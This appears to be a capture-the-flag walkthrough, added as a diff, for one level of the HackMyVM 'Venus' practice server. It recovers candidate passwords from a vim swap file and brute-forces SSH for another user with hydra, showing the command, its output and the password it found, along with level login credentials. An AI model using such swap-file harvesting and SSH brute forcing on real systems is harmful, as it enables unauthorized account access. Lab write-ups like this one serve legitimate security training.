@@ -1,0 +1,58 @@
+# Login using the following credentials.
+
+ssh ariel@venus.hackmyvm.eu -p 5000
+
+pwd: 33EtHoz9a0w2Yqo
+
+Mission 0x27:
+Seems that ariel dont save the password for lola, but there is a temporal file.
+
+Soln:
+
+-> Whenever a text editor fails to save a file properly or due to some external factors you couldn't manually save the file beforehand, the text editor creates a file with the ".swp" extension.
+
+-> These are 'swap' files (hence the extension '.swp') created by text editors such as vim to help recover unsaved data in case of crash or unexpected termination of the editor.
+
+-> You can acces the files using text editors but it would be filled with gibberish. Unless you access it passing some additional arguements.
+
+# ariel@venus:~$ vi -r .goas.swp
+
+-> Here the '-r' arguement would instruct the vim text editor to recover the file from the available swap file (.swp).
+-> You can see the contents of it as well clearly.
+-> You can check the contents of the swap file using the cat command as well.
+
+-> Now extracting all the available strings from the file.
+
+# ariel@venus:/var/tmp/soln$ strings .goas.swp > pwd
+
+-> I'm performing operations in /var/tmp directory as that is one of the directories in which we have all the permissions.
+
+-> Now there will be a low of arrows and stuff so just keep the strings and remove anything extra, even that last pesky sentence. Something as shown below.
+
+# ariel@venus:/var/tmp/soln$ cat pwd
+# VVjqJGRrnfKmcgD
+# bnQgcXYamhSDSff
+# QsymOOVbzSaKmRm
+# ...
+# ppkJjqYvSCIyAhK
+
+-> Using a tool called as 'hydra' on your local machine, you need to brute force ssh into 'ariel' machine, using the follow command.
+
+# ┌──(amogha㉿Amogha)-[~/hackmyvm_venus]
+# └─$ hydra -s 5000 -l lola -P pwd venus.hackmyvm.eu ssh
+# Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+# Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-27 19:59:02
+# [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+# [DATA] max 16 tasks per 1 server, overall 16 tasks, 18 login tries (l:1/p:18), ~2 tries per task
+# [DATA] attacking ssh://venus.hackmyvm.eu:5000/
+# [5000][ssh] host: venus.hackmyvm.eu   login: lola   password: d3LieOzRGX5wud6
+# 1 of 1 target successfully completed, 1 valid password found
+
+-> "hydra -s 5000 -l lola -P pwd venus.hackmyvm.eu ssh"
+	- '-s 5000' : to specify the port number through which you can access the machine (port 5000).
+	- '-l lola' : to specify the user to be logged in as into the machine (user lola).
+	- '-P pwd' : to specify the file containing the passwords to iterate through.
+	- 'venus.hackmyvm.eu ssh' : to specify the method of logging into the machine (url -> venus.hackmyvm.eu).
+
+-> Done!
